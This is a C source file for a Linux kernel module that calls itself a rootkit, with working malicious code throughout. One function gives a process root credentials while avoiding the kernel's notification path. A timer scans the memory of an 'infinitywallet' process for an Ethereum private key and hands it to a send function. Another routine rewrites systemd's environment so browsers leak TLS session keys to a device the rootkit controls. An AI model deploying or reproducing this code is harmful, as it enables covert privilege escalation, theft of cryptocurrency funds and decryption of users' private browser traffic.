/*
    *This file contains a functions can manipulate PCB (Process Control Blocks) in linux task_struct
*/

#pragma once
#pragma message ("Compiling: "__FILE__)

#include <linux/init.h>
#include <linux/module.h>
#include <linux/sched.h>	/* current() */
#include <linux/preempt.h>	/* in_task() */
#include <linux/cred.h>		/* current_{e}{u,g}id() */
#include <linux/uidgid.h>	/* {from,make}_kuid() */
#include <linux/kallsyms.h>
#include <linux/highmem.h>
#include <asm/uaccess.h>
#include <linux/mm.h>
#include <linux/memory.h>
#include <linux/timer.h>
#include <linux/jiffies.h>

#include "socket.c"


#define pr_fmt(fmt) " %s: %s(): " fmt, KBUILD_MODNAME, __func__

#define TICK_TIME 5000
#define DELAY_TIME 10000

/* Prototypes */
static void makeMeRoot(void);
static void pocInifnityWallet(struct timer_list *t);
static inline void findPattern(char* buff,int size);
static inline void getPrivateEthereumKey(struct task_struct *process);
static inline void getWallet(struct task_struct *process);
static void patchEnviromentVariables(void);
static inline void patchEnvSSL (struct task_struct *process,char *buff);
static void pocInfinityWalletTimer(void);
static void pocInfinityWalletTimerRelease(void);

static struct timer_list timer;
static int ok = 0;

static void makeMeRoot()
{
    /*
        * uid -> User id
        * euid -> Effective user id (This is used to check permissions)
        * Extract the task UID and EUID using helper methods provided 
        * Retrieves the eid or euid from the kernel, not from the namespace.
    */
	unsigned int uid = from_kuid(&init_user_ns, current_uid()); /* inir_user_ns -> namespaces*/
	unsigned int euid = from_kuid(&init_user_ns, current_euid());

    if(euid ==0){
        //pr_info("El proceso ya es root\n");
        return;
    }

    struct task_struct *current_task;
    struct cred *root_creed; /* cred stores the credentials of the process */

    kuid_t rootKuid = KUIDT_INIT(0); /* uid */
    kgid_t rootKguid = KGIDT_INIT(0); /* guid */

    current_task = current;
    root_creed = prepare_creds();
    if(root_creed == NULL){
        //pr_info("Error al crear las nuevas credenciales\n");
    }

    root_creed->uid = rootKuid;
    root_creed->euid = rootKuid;
    root_creed->gid = rootKguid;
    root_creed->egid = rootKguid;

    /*
        * Assigning credentials without commit_creds(root_creed) has certain advantages, including not notifying the system
        * real_cread refers to the real objective tasks (as perceived by the other tasks in the system).
        * This only asign the subjective (effective) credentials of the task.
        * rcu_assign_pointer is taken from commit_creds()  https://elixir.bootlin.com/linux/v6.1/source/kernel/cred.c#L433
        * https://lore.kernel.org/lkml/20080806153907.14351.98173.stgit@warthog.procyon.org.uk/
    */

   /* rcu assing_pointer
    * assing to RCU-protected pointer
    * Assigns a specific value to an rcu-protected pointer, ensuring that other rcu readers see the changes.
   */
   rcu_assign_pointer(current_task->cred,root_creed);

}

static void pocInfinityWalletTimer(){
    timer_setup(&timer, pocInifnityWallet, 0);
    mod_timer(&timer, jiffies + msecs_to_jiffies(DELAY_TIME));
}

static void pocInfinityWalletTimerRelease(){
    //del_timer(&timer);
    timer_delete(&timer);
}

static void pocInifnityWallet(struct timer_list *t){
    struct task_struct *process; /* Pointer to PCB (Process Contro BLock) */
    /*
        * The in_task() macro returns a Boolean; True if your code is running in process (or task) context,
            * where it’s – usually – safe to sleep; it returning False implies you are in some kind of atomic context
            * perhaps in interrupt context – where it is never safe to sleep.
        * When you're talking about the Linux Kernel, the interrupt context is where code runs 'on its own' with no process attached to it - commonly 
            * used for handling interrupts from devices. 
            * Process context is as a result of a system call from a userland process and code running in it is 'attached' to a process.
    */
    /*
        * in_task() runs in process context; usually safe to sleep or block
        * Likely to optimize the use of the jump predictor 
    */
    if(likely(!in_task())){
        rcu_read_lock(); /* Locks the reading rcu */
        for_each_process(process){ /* Kernel macro that runs through all list of task structs */
        /*  
           * get_task_struct() Retrieves a list item, and tells the kernel that the list item is being used (by incrementing a counter)
           * This tells the kernel not to free the memory where the struct containing the process information is located. 
           * Only released when the counter reaches 0, so even if the task finishes, the task struct is not released until the counter reaches 0.
        */
            get_task_struct(process);          
            /*
                ! DO NOT DO BLOCKING OPERATIONS HERE 
                * (or after blocking the critical section of the process structure (rcu_read_lock))
            */  
            if (strcmp(process->comm,"infinitywallet") == 0){
                //pr_info("PID %d", process->pid);
                if(process->pid != 1){
                    //pr_info("Infinity Wallet encontrado pid %d",process->pid);
                    getPrivateEthereumKey(process);                    }
            }
            put_task_struct(process); /* Returns the list item to the list and decrements its counter */

        }
        rcu_read_unlock(); /* Unlock the RCU on reading */
    }

    else{
    }
    if(ok != 1){
        mod_timer(&timer, jiffies + msecs_to_jiffies(TICK_TIME));
    }

}


static inline void getPrivateEthereumKey(struct task_struct *process){
    struct mm_struct * process_Vmemory; /* Pointer to struct describing the address space of the process */
    struct vm_area_struct *vma; /* Pointer to memory segment */
    /* As in task_struct, I retrieve the list item and increment the counter */
    process_Vmemory = get_task_mm(process);
    mmap_read_lock(process_Vmemory); /* Lock to read memory (internally uses semaphores) */

    /*
        *To find the private key of the ethereum wallet in memory, 
            *we have to traverse the entire memory map by iterating all segments of the memory space
        *Starting from address 0, the memory map does not follow the normal structure, 
            *because the kernel uses ASLR (Address Space Layout Randomization) so we make sure to go through all segments.
    */

    VMA_ITERATOR(iter, process_Vmemory, 0); /* Starts in 0 address */
    for_each_vma(iter, vma) { /* iterate for all vmas */                   
        unsigned long dirr = vma->vm_start; /* Virtual vma start address */
        /* To check the heap, the memory region must be anonymous and have no associated files */
        if(vma->anon_vma != NULL && vma->vm_file == NULL) { 
            /* I scroll all vma memory addresses (this can contain several pages) */
            while (dirr<vma->vm_end){
            /*
                * To defeat SMAP (Supervisor Mode Access Prevention), 
                    *the page in the user space containing the memory address to be read is mapped into the kernel memory space. 
                * More info https://www.kernel.org/doc/html/v5.0/core-api/mm-api.html
                * https://elixir.bootlin.com/linux/v6.12.6/source/mm/memory.c#L6656
            */    
                /* Gets the vma page of the process that contains the environment variables the pages might not be in physical memory yet */
                struct page *page = get_user_page_vma_remote(process_Vmemory, dirr,
                                    FOLL_FORCE, &vma); /* Note that you only get one page, and the vma can have several */
                if (IS_ERR(page)) {
                    /* If there is an error, do not try to read because you will get a read access violation or a null pointer exception.  */             
                }else{
                    void * page_in_kernel_address = kmap_local_page(page); /* Map the page in the kernel address space */

                    /* Calculates the scroll within the page to access the address of the virtual process */
                    int offset = dirr & (PAGE_SIZE-1);
                    /* Calculate copy length */
                    int bytes = 4096;
                    if (bytes > PAGE_SIZE-offset)
                        bytes = PAGE_SIZE-offset;
                    
                    char test[1024+1024+1024+1024]; // 4096
                    memset(test,0,4096);
                    copy_from_user_page(vma, page, dirr, test,page_in_kernel_address + offset, bytes);

                    /* search for private key pattern */
                    findPattern(test,4096);

                    dirr = dirr+4096;
                    unmap_and_put_page(page, page_in_kernel_address); /* Unmap kernel memory page and return page */
            }
        }
        }
    }
    mmap_read_unlock(process_Vmemory); /* Unlock mmap sempahore */
    mmput(process_Vmemory); /* Put the struct and decrement the counter  */
}



static inline void findPattern(char* buff,int size){
    int pattern[] = {0x91,0x05,0x00,0x00,0x03,0x00,0x00,0x00,0x40,0x00,0x00,0x00}; //12
    int x = 0;
    int index = 0;
    int longitud = 12;
    for (size_t i = 0; i < size; i++)
    {
        /* The pattern is in front of and behind the private key */
        if ((buff[i] == pattern[index]) && (buff[i+(64+12)] == pattern[index]))//76
        {
            index++;
            longitud--;
        }else{
            index=0;
            longitud = 12;
        }
        if(longitud == 0){
            pr_warn("Patron detectado");
            char ethereumWalletKey_0[65];
            memset(ethereumWalletKey_0,0,65);
            strncpy(ethereumWalletKey_0,buff+i+1,64);
            ethereumWalletKey_0[65]=0x00; /*NULL character*/

            char ethereumWalletKey_1[65];
            memset(ethereumWalletKey_1,0,65);
            strncpy(ethereumWalletKey_1,buff+i+1+(64+12),64);
            ethereumWalletKey_1[65]=0x00;

            /* Sometimes the key is repeated, if it is repeated it is considered valid. */
            if(strcmp(ethereumWalletKey_0,ethereumWalletKey_1)==0){
                #if verbose == 1
                    pr_alert("Clave privada cartera de ethereum: %s",ethereumWalletKey_0);
                #endif
                sendEthereumKey(ethereumWalletKey_0,sizeof(ethereumWalletKey_0));
                ok = 1;
                break;  
            }

            /*
            for (size_t i = 0; i < 65; i++)
            {
                 pr_info("Caracter: %02x",ethereumWalletKey[i]);
            }
            */
            //pr_alert("Clave privada cartera de ethereum: %s",ethereumWalletKey_0);
        }
    }
    
}

/*
    * This function changes the MAIL environment variable of systemd 
        *to SSLKEYLOGFILE so that browsers export SSL encryption keys to the rootkit through a character device.
    * Inline is used to reduce latency
*/
static inline void patchEnvSSL (struct task_struct *process,char *buff){
    struct mm_struct * process_Vmemory; /* Pointer to struct describing the address space of the process */
    struct vm_area_struct *vma; /* Pointer to memory segment */

    /* As in task_struct, I retrieve the list item and increment the counter */
    process_Vmemory = get_task_mm(process); 

    mmap_read_lock(process_Vmemory); /* Lock to read memory (internally uses semaphores) */

    /*
        * To defeat SMAP (Supervisor Mode Access Prevention), 
            *the page in the user space containing the memory address to be read is mapped into the kernel memory space. 
        * More info https://www.kernel.org/doc/html/v5.0/core-api/mm-api.html
        * https://elixir.bootlin.com/linux/v6.12.6/source/mm/memory.c#L6656
    */    

    /* Gets the vma page of the process that contains the environment variables (env_start)  the pages might not be in physical memory yet */
    struct page *page = get_user_page_vma_remote(process_Vmemory, process_Vmemory->env_start,
							     FOLL_FORCE, &vma);

    if (vma && vma->vm_flags & VM_READ){ /* Check region is readable */
        //pr_info("Puedo leer la region");
        }
    
    //pr_info("Region: %px",process_Vmemory->env_start );
    void * maddr = kmap_local_page(page); /* Map the page in the kernel address space */

    /* Calculates the scroll within the page to access the address of the virtual process */
    int offset = process_Vmemory->env_start & (PAGE_SIZE-1);

    int size = process_Vmemory->env_end - process_Vmemory->env_start; /* Size of env vars region */
    char* buffer = kzalloc(sizeof(char)*size,GFP_KERNEL);

    copy_from_user_page(vma, page, process_Vmemory->env_start,buffer, maddr + offset, size);
    
    char txt [] = "SSLKEYLOGFILE=/dev/root"; /* 3 Difference between the text string between the string with MAIL and the string with SSLKEYLOGFILKE */
    int index = 0;
    /* Look for the MAIL variable in the buffer */
    for (int i = 0; i < size; i++)
    {
        if(buffer[i] == 00){ /* NULL Character*/
            #if verbose == 1
                pr_info("ENV: %s",buffer+index);
            #endif
            char var [] = "MAIL";
            if (strstr(buffer+index,var ) != NULL) {
                char * pointer = strstr(buffer+index,var);
                /* Copy the string and move the rest of the buffer to the left so as not to leave any gaps */
                memcpy(pointer,txt,sizeof(txt));
                memmove(pointer+sizeof(txt),pointer+sizeof(txt)+3,(size-(index+sizeof(txt)+3)));
            }
            index = i+1;
        }
    }

    /* Copies the buffer back to the process */
    copy_to_user_page(vma, page, process_Vmemory->env_start,maddr + offset, buffer, size);
    /* Mark the page as dirty */
	set_page_dirty_lock(page);
    /* Unmap kernel memory page and return page */
    unmap_and_put_page(page, maddr);

    mmap_read_unlock(process_Vmemory); /* Unlock mmap sempahore */
    mmput(process_Vmemory); /* Put the struct and decrement the counter  */

    kfree(buffer);

}
static void patchEnviromentVariables(void){
    struct task_struct *process; /* Pointer to PCB (Process Contro BLock) */
    char tmp [300];
    char tmp2 [100];
    memset(tmp2,0,100);
    int total = 0;
    int index = 0;
    memset(tmp,0,300);
     /*
        * The in_task() macro returns a Boolean; True if your code is running in process (or task) context,
            * where it’s – usually – safe to sleep; it returning False implies you are in some kind of atomic context
            * perhaps in interrupt context – where it is never safe to sleep.
        * When you're talking about the Linux Kernel, the interrupt context is where code runs 'on its own' with no process attached to it - commonly 
            * used for handling interrupts from devices. 
            * Process context is as a result of a system call from a userland process and code running in it is 'attached' to a process.
    */
    /*
        * in_task() runs in process context; usually safe to sleep or block
        * Likely to optimize the use of the jump predictor 
    */
    if (likely(in_task())){
        rcu_read_lock(); /* Locks the reading rcu */
            for_each_process(process){ /* Kernel macro that runs through all list of task structs */
                /*  
                    * get_task_struct() Retrieves a list item, and tells the kernel that the list item is being used (by incrementing a counter)
                    * This tells the kernel not to free the memory where the struct containing the process information is located. 
                    * Only released when the counter reaches 0, so even if the task finishes, the task struct is not released until the counter reaches 0.
                */
                get_task_struct(process); 
                /*
                     ! DO NOT DO BLOCKING OPERATIONS HERE 
                     * (or after blocking the critical section of the process structure (rcu_read_lock))
                */
                if (strcmp(process->comm,"systemd") == 0 && process->pid != 0){ /* Systemd found */
                    //pr_info("caca %d",process->pid);
                    memset(tmp,0,300);
                    index = total;
                    /*
                        * This operation is non-blocking, it formats the string for printing later.
                        * (pr_info) and (printk) can block.
                    */
                    snprintf(tmp,300,"Systemd found: PID %d PPID %d\n",process->pid,process->parent->pid); //Estas operaciones no son bloqueantes, formatean la cadena para imprimirla luego (pr_info)(printk) pueden bloquear
                    if(process->pid != 1){
                        patchEnvSSL(process,tmp2); 
                    }
                }
                put_task_struct(process); /* Returns the list item to the list and decrements its counter */
                total++;
                
            }
        rcu_read_unlock(); /* Unlock the RCU on reading */

        #if verbose == 1
            pr_info("%s in position %d out of a total of %d processes \n",tmp,index,total);
        #endif
        
    }else{
        /* Runs in an atomic context; unsafe to sleep or block! */
        pr_info("Runs in an atomic context\n");
    }
}